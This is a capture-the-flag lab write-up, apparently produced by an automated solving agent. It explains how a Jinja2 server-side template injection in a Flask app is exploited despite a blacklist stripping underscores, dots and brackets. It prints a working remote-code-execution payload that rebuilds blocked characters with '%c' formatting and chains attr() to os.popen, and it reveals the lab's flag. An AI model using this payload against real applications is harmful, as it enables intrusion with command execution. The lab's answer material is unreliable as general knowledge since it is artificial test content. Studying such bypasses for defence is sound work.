# SSTI2 - Jinja2 SSTI behind a character blacklist, bypassed with %c + attr()

## Metadata

ID: ssti2-jinja-char-strip-filter-bypass-001
Title: SSTI2 - Jinja2 SSTI behind a character blacklist, bypassed with %c + attr()
Source: CyLab Academy lab instance (direct URL, no platform login)
Type: web / server-side template injection + filter evasion
Tags: ssti, jinja2, flask, waf-bypass, filter-bypass, rce, web, cylab
Technique: ssti

## Challenge Summary

The second lab of the SSTI series. Same Flask "announce" application, but the
input passes through a blacklist filter before rendering. The application
strips `_`, `.`, `[`, `]`, and the substring `base` from the submitted value,
so the direct chain from SSTI1 does not survive.

Goal: bypass the filter and read the flag file from the container.

## Initial Observations

- Identical surface to SSTI1: `POST /` field `content`, then `307` to
  `/announce`, which only accepts POST.
- `{{7*7}}` renders `49` and `{{config}}` renders the Config object: SSTI is
  still alive.
- `{{7*7}}` without quotes is printed verbatim, so a missing operator is not
  the issue.
- Any payload the filter mangles into invalid syntax produces the taunting
  line `Stop trying to break me >:(`.

## Acknowledgement

- Source: the `content` form field. Sink: `render_template_string`.
- The filter is a character blacklist, so the payload must be **rebuilt at
  runtime** rather than merely encoded.
- This lab inherits from SSTI1: the same object-subclass ladder applies, the
  filter is the only new obstacle.

## Memory Applied

- `knowledge/ssti.md` - escalation ladder, and the note that blocked characters
  can be recovered from a request value the filter does not touch.
- `experiences/ssti1-flask-render-template-string-001` - the
  `config.__class__.__init__.__globals__ -> os -> popen` chain, and the rule to
  run one command per request.

## Filter characterisation (the key step)

Probing one character at a time (`A<char>B`) revealed the blacklist exactly:

- Stripped: `_` `.` `[` `]`
- Preserved: parentheses, quotes, `|`, `:`, `,`, `;`, `-`, `\`, `=`, `+`,
  `*`, `<`, `>`, `&`, `#`, `!`, `~`, `^`, `%`, `@`, backtick, `{`, `}`, `$`,
  and all alphanumerics.
- The literal substring `base` is stripped too, so `base64` becomes `64`.

The taunting string is **not a WAF**: it is the application's own
`except TemplateSyntaxError` branch. Any payload that becomes a syntax error
after stripping lands there, which is why `{{'x'.upper()}}` produced it while
an undefined variable such as `{{configclass}}` simply rendered as empty.

## Bypass

`_`, `.`, `[`, `]` are all unavailable, so attribute access and indexing must
avoid all four. Three facts made this work:

1. **Jinja string literals accept `%c` format conversion.** With the string
   format filter, `%c` takes a character code, so `%c` with code 95 yields `_`.
   The filter never sees a literal `_` because the request contains only the
   code.
2. **`{% set %}` works and its block tag is not filtered**, so one variable can
   hold the character and names can be concatenated.
3. **`|attr()` is the only attribute access left** (no dots), and in Jinja >= 3.1
   `attr` performs **getattr only** - item lookup was removed.

Final working payload:

```text
{% set u = '%c'|format(95) %}{{ (config|attr(u+u+'class'+u+u)|attr(u+u+'init'+u+u)|attr(u+u+'globals'+u+u)|attr('get')('os')|attr('popen'))('id')|attr('read')() }}
```

Why each piece is necessary:

- `|attr('__globals__')|attr('os')` renders **empty**: `__globals__` is a dict,
  and `getattr(dict, 'os')` fails under Jinja >= 3.1. Go through a dict method
  instead: `|attr('get')('os')`.
- `|attr('read')()` is valid: the value of `popen(...)` is a file object, so
  `attr('read')` then `()` returns the output with no `.` anywhere.

## Attempts

### Attempt 1 - Confirm SSTI is still alive

Action: `{{7*7}}`, then `{{config}}`.
Result: `49` and the Config object.
Analysis: the injection point survived; only the payload syntax is restricted.

### Attempt 2 - Direct chain with dots and brackets

Action: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`.
Result: the taunting line.
Analysis: `[]` is stripped, so the payload becomes invalid syntax.

### Attempt 3 - Recover `_` at runtime

Action: `{% set u = '%c'|format(95) %}` and build `u+u+'class'+u+u`.
Result: `_` and `__class__` rendered.
Analysis: the format conversion defeats the character strip completely.

### Attempt 4 - `|attr()` chain, then the dict problem

Action: `...|attr('__globals__')|attr('os')`.
Result: HTTP 200 with an **empty** body.
Analysis: `attr` in this Jinja version is getattr-only, so a dict key lookup
returns Undefined. Redirect the lookup through `dict.get`.

### Attempt 5 - `|attr('get')('os')|attr('popen')('id')`

Action: chain through `dict.get` instead of `attr`.
Result: `uid=0(root) gid=0(root) groups=root`.
Analysis: RCE as root.

### Attempt 6 - Shell commands silently returning nothing

Action: `wc -c /challenge/app.py`, `cat /challenge/requirements.txt`.
Result: every one returned an empty body with status 200.
Analysis: the strip applies to the **whole request value, including the shell
command**, so `app.py` became `apppy` and `base64` became `64`. `popen` does
not raise; the shell error goes to stderr and `.read()` returns "".

### Attempt 7 - Recover the dot inside the command

Action: rebuild the dot at runtime inside the command string as well.
Result: full command output rendered, `uid=0(root)`.
Analysis: the same escape trick applies inside the command, so filenames
survive.

### Attempt 8 - Locate, read and verify the flag

Action: `ls -la /` -> `find / -maxdepth 4 -iname '*flag*'` -> read the flag file.
Result: `/challenge/flag`, 36 bytes, `academy{...}`, no trailing newline,
md5 `ca30ead7dfceee67f3991d321fa128b4`, confirmed byte-exact with `od -c`.
Analysis: three independent reads agree.

## Successful Approach

1. Confirm SSTI is alive (`{{7*7}}`, `{{config}}`).
2. Characterise the filter by probing one character per request instead of
   guessing.
3. Recognise that the taunting message is a `TemplateSyntaxError` handler,
   not a WAF.
4. Rebuild the blocked character at runtime with `%c` format conversion plus
   `{% set %}`.
5. Use `|attr()` for attributes and `|attr('get')(key)` for dict keys.
6. Rebuild blocked characters inside the shell command too.
7. Read the flag and verify it independently.

## Tools Used

- `http_fetch` (existing) - recon of the home page.
- `ssti_probe` (existing) - all injection steps, including the 307 redirect.
- No new tool script was created and none was kept: the existing tools were
  sufficient.

## Final Result

Flag obtained: `academy{sst1_f1lt3r_byp4ss_cc3256b8}` (36 bytes,
md5 `ca30ead7dfceee67f3991d321fa128b4`, confirmed byte-exact with `od -c`).

## Failed Approaches

- Dot- and bracket-based chain -> syntax error after stripping.
- `|attr('__globals__')|attr('os')` -> silent empty result, because `attr` is
  getattr-only in modern Jinja.
- Shell commands naming files with dots -> silently empty output, because the
  dot was stripped from the command itself.

## Lessons Learned

- **Empty output is evidence, not "nothing happened".** A silent empty body
  usually means the command was mangled, not that the target is empty; check
  the command string for stripped characters.
- **Probe filters empirically.** One character per request turns a guess into a
  fact and reveals the exact blacklist immediately.
- **A taunting message is often just an exception handler.** Reading the target
  source through the RCE you already have settles it in one request.
- **Server-side language features survive naive input filters**, because the
  filter sees the mechanism, not the character it produces.
- Pick gadget names that are filter-safe: comparing against a class whose name
  contains no blocked character needs no rebuilding.

## Reusable Knowledge

See `knowledge/ssti.md`, sections "Bypassing character-stripping filters",
"Taunting messages are often exception handlers", and "Blacklist bypass".
